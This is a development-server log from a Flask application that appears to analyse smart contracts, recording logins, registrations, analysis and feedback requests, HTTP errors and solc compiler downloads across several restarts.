2025-06-21 12:07:22,712 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 12:15:31,042 - app.app - INFO - Application started
2025-06-21 12:15:31,059 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.21.0.5:8000
2025-06-21 12:15:31,062 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 12:15:33,935 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:33] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 12:15:33,970 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 12:15:33,983 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 12:15:34,060 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 12:15:34,127 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_12-15, status: ERROR
2025-06-21 12:15:34,129 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 12:15:34,132 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:34] "POST /analyze HTTP/1.1" 200 -
2025-06-21 12:15:34,153 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:34] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 12:15:34,204 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:34] "[35m[1mGET /history HTTP/1.1[0m" 500 -
2025-06-21 12:15:41,186 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:41] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 12:15:41,618 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:41] "POST /login HTTP/1.1" 200 -
2025-06-21 12:15:43,804 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:43] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 12:15:43,834 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 12:15:43,846 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 12:15:43,855 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 12:15:43,874 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_12-15, status: ERROR
2025-06-21 12:15:43,876 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 12:15:43,879 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:43] "POST /analyze HTTP/1.1" 200 -
2025-06-21 12:15:43,895 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:43] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 12:15:43,919 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:43] "[35m[1mGET /history HTTP/1.1[0m" 500 -
2025-06-21 12:15:47,013 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 12:15:47] "[35m[1mGET /history HTTP/1.1[0m" 500 -
2025-06-21 12:16:39,114 - app.app - INFO - Application started
2025-06-21 12:16:39,128 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.23.0.5:8000
2025-06-21 12:16:39,129 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 12:17:24,181 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:24] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 12:17:24,293 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:24] "[33mGET /history HTTP/1.1[0m" 404 -
2025-06-21 12:17:30,979 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:30] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 12:17:31,011 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:31] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-21 12:17:44,732 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:44] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 12:17:45,184 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:45] "POST /register HTTP/1.1" 200 -
2025-06-21 12:17:51,733 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:51] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 12:17:52,135 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:52] "POST /login HTTP/1.1" 200 -
2025-06-21 12:17:55,153 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:55] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 12:17:55,186 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 12:17:55,201 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 12:17:55,207 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 12:17:55,247 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_12-17, status: ERROR
2025-06-21 12:17:55,249 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 12:17:55,251 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:55] "POST /analyze HTTP/1.1" 200 -
2025-06-21 12:17:55,269 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:55] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 12:17:55,317 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:55] "GET /history HTTP/1.1" 200 -
2025-06-21 12:17:57,586 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:57] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 12:17:57,613 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 12:17:57,662 - app.api.feedback - INFO - Feedback saved with ID: 1, status: OK, user_score: 1, weight_request: 1.0
2025-06-21 12:17:57,665 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:17:57] "POST /feedback HTTP/1.1" 200 -
2025-06-21 12:18:01,228 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:01] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 12:18:01,256 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 12:18:01,268 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 12:18:01,276 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 12:18:01,295 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_12-18, status: ERROR
2025-06-21 12:18:01,297 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 12:18:01,300 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:01] "POST /analyze HTTP/1.1" 200 -
2025-06-21 12:18:01,314 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:01] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 12:18:01,337 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:01] "GET /history HTTP/1.1" 200 -
2025-06-21 12:18:03,742 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:03] "GET /history HTTP/1.1" 200 -
2025-06-21 12:18:09,700 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:09] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 12:18:09,726 - app.api.feedback - INFO - Received feedback submission from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 12:18:09,757 - app.api.feedback - INFO - Feedback saved with ID: 2, status: KO, user_score: 1, weight_request: 0.3
2025-06-21 12:18:09,760 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:09] "POST /feedback HTTP/1.1" 200 -
2025-06-21 12:18:13,098 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:13] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 12:18:13,128 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 12:18:13,139 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 12:18:13,148 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 12:18:13,169 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_12-18, status: ERROR
2025-06-21 12:18:13,171 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 12:18:13,173 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:13] "POST /analyze HTTP/1.1" 200 -
2025-06-21 12:18:13,188 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:13] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 12:18:13,216 - werkzeug - INFO - 172.23.0.1 - - [21/Jun/2025 12:18:13] "GET /history HTTP/1.1" 200 -
2025-06-21 13:00:12,304 - app.app - INFO - Application d√©marr√©e
2025-06-21 13:00:12,318 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.25.0.5:8000
2025-06-21 13:00:12,320 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 13:00:42,849 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:00:42] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 13:00:42,940 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:00:42] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-21 13:01:19,987 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:19] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 13:01:20,444 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:20] "POST /register HTTP/1.1" 200 -
2025-06-21 13:01:30,032 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:30] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 13:01:30,453 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:30] "POST /login HTTP/1.1" 200 -
2025-06-21 13:01:35,104 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:35] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 13:01:35,138 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:01:35,151 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 13:01:35,159 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 13:01:35,197 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_13-01, status: ERROR
2025-06-21 13:01:35,198 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 13:01:35,201 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:35] "POST /analyze HTTP/1.1" 200 -
2025-06-21 13:01:35,216 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:35] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 13:01:35,258 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:35] "GET /history HTTP/1.1" 200 -
2025-06-21 13:01:44,931 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:44] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 13:01:44,961 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:01:44,973 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 13:01:44,984 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 13:01:45,003 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_13-01, status: ERROR
2025-06-21 13:01:45,005 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 13:01:45,007 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:45] "POST /analyze HTTP/1.1" 200 -
2025-06-21 13:01:45,022 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:45] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 13:01:45,044 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:45] "GET /history HTTP/1.1" 200 -
2025-06-21 13:01:49,160 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:49] "GET /history HTTP/1.1" 200 -
2025-06-21 13:01:51,354 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:51] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 13:01:51,380 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:01:51,430 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 1, statut: OK, score utilisateur: 1, poids de la requ√™te: 1.0
2025-06-21 13:01:51,433 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:51] "POST /feedback HTTP/1.1" 200 -
2025-06-21 13:01:52,967 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:01:53,003 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 2, statut: OK, score utilisateur: 1, poids de la requ√™te: 1.0
2025-06-21 13:01:53,007 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:53] "POST /feedback HTTP/1.1" 200 -
2025-06-21 13:01:58,261 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:58] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 13:01:58,293 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:01:58,304 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 13:01:58,312 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 13:01:58,332 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_13-01, status: ERROR
2025-06-21 13:01:58,334 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 13:01:58,337 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:58] "POST /analyze HTTP/1.1" 200 -
2025-06-21 13:01:58,352 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:58] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 13:01:58,375 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:01:58] "GET /history HTTP/1.1" 200 -
2025-06-21 13:02:00,540 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:02:00] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 13:02:00,579 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:02:00,611 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 3, statut: KO, score utilisateur: 1, poids de la requ√™te: 0.0
2025-06-21 13:02:00,614 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:02:00] "POST /feedback HTTP/1.1" 200 -
2025-06-21 13:02:02,850 - werkzeug - INFO - 172.25.0.1 - - [21/Jun/2025 13:02:02] "GET /history HTTP/1.1" 200 -
2025-06-21 13:13:24,404 - app.app - INFO - Application d√©marr√©e
2025-06-21 13:13:24,418 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.29.0.5:8000
2025-06-21 13:13:24,420 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 13:14:06,449 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:14:06] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 13:14:06,545 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:14:06] "[33mGET /history HTTP/1.1[0m" 404 -
2025-06-21 13:14:12,098 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:14:12] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 13:14:12,127 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:14:12] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-21 13:15:02,712 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:02] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 13:15:03,156 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:03] "POST /register HTTP/1.1" 200 -
2025-06-21 13:15:10,329 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:10] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 13:15:10,743 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:10] "POST /login HTTP/1.1" 200 -
2025-06-21 13:15:14,134 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:14] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 13:15:14,167 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:15:14,182 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 13:15:14,190 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 13:15:14,232 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_13-15, status: ERROR
2025-06-21 13:15:14,234 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 13:15:14,238 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:14] "POST /analyze HTTP/1.1" 200 -
2025-06-21 13:15:14,257 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:14] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 13:15:14,305 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:14] "GET /history HTTP/1.1" 200 -
2025-06-21 13:15:16,572 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:16] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 13:15:16,600 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:15:16,650 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 1, statut: OK, poids de la requ√™te: 4.0
2025-06-21 13:15:16,653 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:16] "POST /feedback HTTP/1.1" 200 -
2025-06-21 13:15:20,901 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:20] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 13:15:20,929 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:15:20,941 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 13:15:20,951 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-21 13:15:20,970 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_13-15, status: ERROR
2025-06-21 13:15:20,972 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 13:15:20,974 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:20] "POST /analyze HTTP/1.1" 200 -
2025-06-21 13:15:20,989 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:20] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 13:15:21,010 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:21] "GET /history HTTP/1.1" 200 -
2025-06-21 13:15:23,451 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:23] "OPTIONS /feedback HTTP/1.1" 200 -
2025-06-21 13:15:23,476 - app.api.feedback - INFO - R√©ception d'un retour depuis le portefeuille: 0xAb5801a7D398351b8bE11C439e05C5B3259aec44
2025-06-21 13:15:23,510 - app.api.feedback - INFO - Retour sauvegard√© avec ID: 2, statut: KO, poids de la requ√™te: 0.0
2025-06-21 13:15:23,513 - werkzeug - INFO - 172.29.0.1 - - [21/Jun/2025 13:15:23] "POST /feedback HTTP/1.1" 200 -
2025-06-21 15:20:57,016 - app.app - INFO - Application started
2025-06-21 15:20:57,045 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.176.5:8000
2025-06-21 15:20:57,049 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 15:22:45,014 - app.app - INFO - Application started
2025-06-21 15:22:45,036 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.208.5:8000
2025-06-21 15:22:45,038 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 15:22:56,398 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:22:56] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:22:56,860 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:22:56] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-21 15:23:10,731 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:10] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 15:23:10,763 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:10] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:13,046 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:13] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:15,380 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:15] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:15,545 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:15] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:15,728 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:15] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:15,900 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:15] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 15:23:15,937 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:15] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:16,110 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:16] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:16,249 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:16] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:16,411 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:16] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:16,747 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:16] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:16,982 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:16] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:17,295 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:17] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:17,507 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:17] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:17,696 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:17] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:17,897 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:17] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:18,062 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:18] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:23:18,209 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:23:18] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:24:21,133 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:24:21] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 15:24:21,188 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:24:21] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:24:21,826 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:24:21] "[31m[1mPOST /register HTTP/1.1[0m" 400 -
2025-06-21 15:24:28,007 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:24:28] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:24:28,474 - werkzeug - INFO - 192.168.208.1 - - [21/Jun/2025 15:24:28] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-21 15:28:18,320 - app.app - INFO - Application started
2025-06-21 15:28:18,346 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.19.0.5:8000
2025-06-21 15:28:18,350 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 15:28:20,019 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:28:20] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:28:20,515 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:28:20] "[31m[1mPOST /login HTTP/1.1[0m" 401 -
2025-06-21 15:28:35,531 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:28:35] "OPTIONS /register HTTP/1.1" 200 -
2025-06-21 15:28:36,011 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:28:36] "POST /register HTTP/1.1" 200 -
2025-06-21 15:28:41,635 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:28:41] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:28:42,042 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:28:42] "POST /login HTTP/1.1" 200 -
2025-06-21 15:29:10,090 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:29:10] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 15:29:10,121 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 15:29:10,134 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 15:29:10,152 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-21 15:29:10,342 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
2025-06-21 15:29:11,292 - solcx - INFO - Using solc version 0.8.0
2025-06-21 15:29:11,295 - solcx - INFO - solc 0.8.0 successfully installed at: /root/.solcx/solc-v0.8.0
2025-06-21 15:29:11,301 - solcx - INFO - Using solc version 0.8.0
2025-06-21 15:29:13,834 - app.api.contract - INFO - Report saved with filename: Unknown_2025-06-21_15-29, status: ERROR
2025-06-21 15:29:13,836 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-21 15:29:13,839 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:29:13] "POST /analyze HTTP/1.1" 200 -
2025-06-21 15:29:13,858 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:29:13] "OPTIONS /history HTTP/1.1" 200 -
2025-06-21 15:29:13,903 - werkzeug - INFO - 172.19.0.1 - - [21/Jun/2025 15:29:13] "GET /history HTTP/1.1" 200 -
2025-06-21 15:33:42,014 - app.app - INFO - Application started
2025-06-21 15:33:42,027 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.21.0.5:8000
2025-06-21 15:33:42,028 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-21 15:33:51,479 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 15:33:51] "OPTIONS /login HTTP/1.1" 200 -
2025-06-21 15:33:51,958 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 15:33:51] "POST /login HTTP/1.1" 200 -
2025-06-21 15:33:58,657 - werkzeug - INFO - 172.21.0.1 - - [21/Jun/2025 15:33:58] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-21 15:33:58,686 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-21 15:33:58,698 - app.api.contract - INFO - Analyzing code snippet
2025-06-21 15:33:58,721 - app.api.contract - INFO - Starting contract analysis for user: 2
2025-06-21 15:33:58,917 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.8.0+commit.c7dfd78e
